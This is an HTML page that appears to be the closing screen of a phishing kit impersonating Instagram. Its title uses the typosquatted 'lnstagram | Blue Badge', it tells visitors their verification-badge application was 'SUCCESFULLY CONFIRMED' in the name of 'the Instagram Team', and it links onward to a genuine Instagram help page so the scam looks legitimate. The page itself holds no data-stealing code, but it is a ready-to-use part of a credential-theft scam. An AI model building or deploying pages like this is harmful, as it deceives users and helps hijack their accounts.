<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" href="files/style.css" type="text/css" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/xcode.css">
	<link rel="stylesheet" type="text/css" href="css/xcode2.css">
	<link rel="stylesheet" type="text/css" href="css/xcode3.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.hizliresim.com/egpgwd2.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">

	<title>lnstagram | Blue Badge</title>
	<style>
	*{
	transition:0.0s;
}
	.a_adaskpd{
      padding:7px 30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#08a0e9;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
	  }
	</style>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="files/header.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
	</header><br><br>
<center>

<div class="center" style="background: white; border-radius:4px;">
<br>
<center>
 <div  style="margin-bottom:20px;"></div>
 <h2 class="AjK3K" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif; margin: 0 auto 3px;" align="center"><b> Thank You!</b></h2>
 <div  style="margin-bottom:20px;"></div>
 <center>
  <img src="files/thanks.gif" style="width:150px; margin-left:45px;">
 </center>
 <div  style="margin-bottom:25px;"></div>
 <h2 class="AjK3K" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif; margin: 0 auto 3px;" align="center"><b>SUCCESFULLY CONFIRMED</b></h2>
<div  style="margin-bottom:25px;"></div>
<p style="font-size: 115%;margin-left: 5%;margin-right: 5%;font-family: Helvetica, Arial, Sans-Serif;">Blue badge application has been successfully completed, our support team will get back to you as soon as possible.</p>
<div  style="margin-bottom:30px;"></div>
<div style="font-family:sans-serif; font-size:14px; color:#999;">
<p class="GusmU  t_gv9    ">As the Instagram Team, we attach great importance to Community guidelines.</p>
<br> 
</div>
<form action="https://help.instagram.com/312685272613322">
<span class="idhGk _1OSdk">
<center><button type="submit"  style="margin-top:6px;width:230px;background: #3897f0; border-color: #3897f0; color: #fff; " class="a_adaskpd">Get more information</button></center>
</form>
<div  style="margin-bottom:10px;"></div>
</center>
</div>
<br>
<br>

</center>

</body>
</html>